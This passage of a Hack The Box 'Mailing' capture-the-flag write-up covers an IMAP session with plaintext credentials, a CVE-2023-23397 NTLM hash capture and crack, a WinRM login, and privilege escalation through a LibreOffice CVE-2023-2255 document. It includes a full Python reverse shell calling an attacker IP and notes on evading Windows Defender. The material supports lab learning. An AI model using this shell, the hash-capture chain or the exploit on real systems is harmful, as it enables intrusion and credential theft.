< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 SELECT Sent
< * 2 EXISTS
< * 0 RECENT
< * FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
< * OK [UIDVALIDITY 1714938065] current uidvalidity
< * OK [UIDNEXT 3] next uid
< * OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
< A003 OK [READ-WRITE] SELECT completed
> A004 FETCH 2 (BODY[TEXT])
< * 2 FETCH (BODY[TEXT] {6780}
* 2 FETCH (BODY[TEXT] {6780}
< This is a multi-part message in MIME format.
< --------------D57Ad0Z2UyPvNUOgtktdJEAg
< Content-Type: text/plain; charset=UTF-8; format=flowed
< Content-Transfer-Encoding: 7bit
<
< Check the .msg to view the appointment.
< --------------D57Ad0Z2UyPvNUOgtktdJEAg
< Content-Type: application/octet-stream; name="appointment.msg"
< Content-Disposition: attachment; filename="appointment.msg"
< Content-Transfer-Encoding: base64
<
< 0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAAwAAAAAA
< AAAAEAAAAgAAAAEAAAD+////AAAAAAcAAAD/////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< //////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAMADTQGAAAA/r+hAAAAAAAeABoABgAAABAAAAAAAAAAHgA3AAYAAAAPAAAAAAAAAB4A
< ABAGAAAAEgAAAAAAAAAeAACABgAAABAAAAAAAAAACwABgAYAAAABAAAAAAAAAEAAAoAGAAAA
< gI3aQfGe2gFAAAOABgAAAICN2kHxntoBHgAEgAYAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AABQYXJpcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAXFwxMC4xMC4xNC4xMTJcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6CAAAIAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANggAACAACAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIIAAAgABAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgg
< BgAAAAAAwAAAAAAAAEYCIAYAAAAAAMAAAAAAAABGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAfhQAABgAAAByFAAAGAAEADYIAAAgAAgAOggAACAADAAiCAAAIAAQAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAH4UAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByFAAAGAAEAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJUE0uQXBwb2ludG1lbnQA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ1ZFLTIw
< MjMtMjMzOTcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAE5ldyBtZWV0aW5nIG5vdyAhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAIggAACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAD+/////v////7////+/////v////7/
< ///+/////v////7////+/////v////7////+////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< //////////////////////////////////////////////////////////////////9SAG8A
< bwB0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAACgAFAP//////////AQAAAAsNAgAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAADAAwAAAAAAAF8AXwBzAHUAYgBzAHQAZwAxAC4AMABfADEAMAAwADAAMAAwADEA
< RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIBAgAAAA0AAAD/////AAAAAAAAAAAAAAAA
< AAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBDgAAABEAAAAAAAAAXwBfAHMAdQBiAHMAdABnADEA
< LgAwAF8AMAAwADMANwAwADAAMQBFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACoAAgEDAAAA
< //////////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoBgI3aQfGe2gENAAAADgAAAAAA
< AABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAwADAAMQBBADAAMAAxAEUAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAKgACAQQAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAgI3aQfGe
< 2gGAjdpB8Z7aAQwAAAAPAAAAAAAAAF8AXwBuAGEAbQBlAGkAZABfAHYAZQByAHMAaQBvAG4A
< MQAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAEB//////////8FAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBAAAAAAAAAAAAAAAAXwBfAHMAdQBiAHMA
< dABnADEALgAwAF8AMQAwADAANQAwADEAMAAyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACoA
< AgAGAAAACgAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoBgI3aQfGe2gELAAAA
< CAAAAAAAAABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAxADAAMAA0ADAAMQAwADIAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAKgACAAcAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAA
< gI3aQfGe2gGAjdpB8Z7aAQoAAAAIAAAAAAAAAF8AXwBzAHUAYgBzAHQAZwAxAC4AMABfADAA
< MAAwADQAMAAxADAAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIACAAAAP//////////
< AAAAAAAAAAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBAAAAAAAAAAAAAAAAXwBfAHMA
< dQBiAHMAdABnADEALgAwAF8AMAAwADAAMwAwADEAMAAyAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAACoAAgAJAAAA//////////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoBgI3aQfGe
< 2gEJAAAAKAAAAAAAAABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAwADAAMAAyADAAMQAwADIA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgACAP///////////////wAAAAAAAAAAAAAAAAAA
< AAAAAAAAgI3aQfGe2gGAjdpB8Z7aAQgAAAAgAAAAAAAAAF8AXwBzAHUAYgBzAHQAZwAxAC4A
< MABfADEAMAAxADEAMAAxADAAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIA/////wsA
< AAD/////AAAAAAAAAAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBBwAAAAgAAAAAAAAA
< XwBfAHMAdQBiAHMAdABnADEALgAwAF8AMQAwADEANgAwADEAMAAyAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAACoAAgD/////DAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoB
< gI3aQfGe2gEGAAAACAAAAAAAAABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAxADAAMQA3ADAA
< MQAwADIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgACAP///////////////wAAAAAAAAAA
< AAAAAAAAAAAAAAAAgI3aQfGe2gGAjdpB8Z7aAQUAAAAIAAAAAAAAAF8AXwBzAHUAYgBzAHQA
< ZwAxAC4AMABfADgAMAAwADAAMAAwADEARQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIB
< /////w4AAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBBAAAAA8A
< AAAAAAAAXwBfAHMAdQBiAHMAdABnADEALgAwAF8AOAAwADAANAAwADAAMQBFAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAACoAAgH/////DwAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN
< 2kHxntoBgI3aQfGe2gEDAAAABQAAAAAAAABfAF8AcAByAG8AcABlAHIAdABpAGUAcwBfAHYA
< ZQByAHMAaQBvAG4AMQAuADAAAAAAAAAAAAAAAAAAAAAAAAAAMAACAf///////////////wAA
< AAAAAAAAAAAAAAAAAAAAAAAAgI3aQfGe2gGAjdpB8Z7aAQAAAACwAAAAAAAAAAEAAAD+////
< /v///wQAAAAFAAAABgAAAP7////9////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////
<
< --------------D57Ad0Z2UyPvNUOgtktdJEAg--
< )
< A004 OK FETCH completed
* Connection #0 to host mailing.htb left intact

```

```
vim mail2

:%s/<//g
:%s/ //g

vim mail1

:%s/<//g
:%s/ //g
```

* Save sent mail body and open in vim. Remove all < and empty spaces.
* Cat saved file and pipe to base64 decode.
* Both sent emails contain the same base64.

```
47
IPM.AppointmentCVE-2023-23397New meeting nowRoot

__substg1.0_001A001E*AAAA
                       __nameid_version1.0(AA__substg1.0_10050102*
AA
 __substg1.0_10040102*AA
__substg1.0_00040102AA__substg1.0_00030102*     AA      (__substg1.0_00020102*A __substg1.0_10110102*
                                                                                                     A__substg1.0_10160102*
                                                                                                                           A__substg1.0_10170102*A__substg1.0_8000001E*AA__substg1.0_8004001E*AA__properties_version1.00AA%
```

* I dont think i was supposed to see those, probably from another HTB users... they are gone now after a machine reset.

## Nmap Again

```
nmap -sV -sC mailing.htb -p5985,5986 --disable-arp-ping -n
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-05 15:38 EDT
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.39s latency).

PORT     STATE    SERVICE VERSION
5985/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp filtered wsmans
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.16 seconds
```

### Hash Capture

* [https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file](https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file)

```
 python3 poc.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url "\\10.10.16.48\test\meeting" --subject "poc"
```

#### Responder

```
sudo responder -I tun0


[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:2a1bdbc690e6039c:890E9EEDCB0E12FAF3EC4D12F7422921:01010000000000008068DC47099FDA010CA6FF233C067B41000000000200080056004E003100500001001E00570049004E002D003000360044005700480054005600510034005400340004003400570049004E002D00300036004400570048005400560051003400540034002E0056004E00310050002E004C004F00430041004C000300140056004E00310050002E004C004F00430041004C000500140056004E00310050002E004C004F00430041004C00070008008068DC47099FDA01060004000200000008003000300000000000000000000000002000005C9249369536904904507CDCD04E3C8CC33B8CC36F2A513002490D8D82B415160A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00340038000000000000000000
```

```
hashcat -m 5600 -a0 maya::MAILING:2a1bdbc690e6039c:890E9EEDCB0E12FAF3EC4D12F7422921:01010000000000008068DC47099FDA010CA6FF233C067B41000000000200080056004E003100500001001E00570049004E002D003000360044005700480054005600510034005400340004003400570049004E002D00300036004400570048005400560051003400540034002E0056004E00310050002E004C004F00430041004C000300140056004E00310050002E004C004F00430041004C000500140056004E00310050002E004C004F00430041004C00070008008068DC47099FDA01060004000200000008003000300000000000000000000000002000005C9249369536904904507CDCD04E3C8CC33B8CC36F2A513002490D8D82B415160A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00340038000000000000000000 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) Iris(R) Xe Graphics, 3168/6441 MB (1610 MB allocatable), 80MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 972 MB

Dictionary cache building /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt: 33553435 bytes (23
Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

MAYA::MAILING:2a1bdbc690e6039c:890e9eedcb0e12faf3ec4d12f7422921:01010000000000008068dc47099fda010ca6ff233c067b41000000000200080056004e003100500001001e00570049004e002d003000360044005700480054005600510034005400340004003400570049004e002d00300036004400570048005400560051003400540034002e0056004e00310050002e004c004f00430041004c000300140056004e00310050002e004c004f00430041004c000500140056004e00310050002e004c004f00430041004c00070008008068dc47099fda01060004000200000008003000300000000000000000000000002000005c9249369536904904507cdcd04e3c8cc33b8cc36f2a513002490d8d82b415160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340038000000000000000000:m4y4ngs4ri

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MAYA::MAILING:2a1bdbc690e6039c:890e9eedcb0e12faf3ec...000000
Time.Started.....: Sun May  5 17:20:35 2024 (9 secs)
Time.Estimated...: Sun May  5 17:20:44 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   653.2 kH/s (6.83ms) @ Accel:8 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5939200/14344384 (41.40%)
Rejected.........: 0/5939200 (0.00%)
Restore.Point....: 5898240/14344384 (41.12%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: madrsa -> m1novio

```

```
maya:m4y4ngs4ri
```

## WinRM

```
evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
cd ../Desktop
type user.txt
92dc5fd46e8bf89b4181d87f5c1f90d6
```

### WinPeas

```
Possible Password found: sha1                                                                  
C:\Users\maya\AppData\Roaming\LibreOffice\4\crash\dump.ini                                     
sha1 triggered                                                                                 
  Version=7.4.0.1                                                                              
> BuildID=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf                                             
  URL=https://crashreport.libreoffice.org/submit/  
```

* Searching Vulners to any exploits

## Priviledge Escalation

<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

* [https://github.com/elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file)

#### Shell.py

```python
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.48",9001))

p=subprocess.Popen(["\\windows\system32\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

```bash
python3 CVE-2023-2255.py --cmd 'python C:\Users\maya\Documents\shell.py' --output 'exploit.odt'
python3 -m http.server
```

```
nc -lvnp 9001
```

```
cd C:\users\maya\documents
wget http://10.10.16.48:8000/shell.py
cd "C:\important documents"
wget http://10.10.16.48:8000/exploit.odt
```

## Root

<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

***

## Things Learned

* Using LFI to navigate the file system to look for config files containing credentials.
* Using crackstation to quickly crack password hashes.
* Using Interceptor to capture NTLM hash.
* Bypassing Windows Defender using python, as well as [Chimera](https://github.com/tokyoneon/Chimera/tree/master) or [PyFuscation](https://github.com/CBHue/PyFuscation) to obfuscation scripts.
* Using Evil-WinRM to remotely log into a windows machine.
* Using powershell one-liner to show installed programs and finding priviledge escalation exploits using software versions.
